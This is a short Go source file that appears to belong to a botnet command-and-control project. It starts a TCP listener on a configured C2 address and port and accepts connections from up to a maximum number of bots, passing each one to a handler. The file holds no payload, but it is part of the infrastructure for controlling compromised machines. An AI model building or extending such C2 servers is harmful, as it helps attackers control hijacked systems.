package server

import (
	"fmt"
	"net"
	config "ivy/util/config"
)


/*
    *    util/server/socket.go
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


func SocketServer() {
	var ConnectionCount int = 0
	s, err := net.Listen("tcp", config.C2_IP + ":" + config.C2_PORT)
	if err != nil {
		fmt.Printf("Fatal error: Could not start server. IP: %s | Port: %s\n", config.C2_IP, config.C2_PORT)
	}
	defer s.Close()
	for {
		if ConnectionCount > config.MAX_BOTS {
			break
		}
		connection, _ := s.Accept()
		go ConnectionHandler(connection)
		ConnectionCount++
	}
}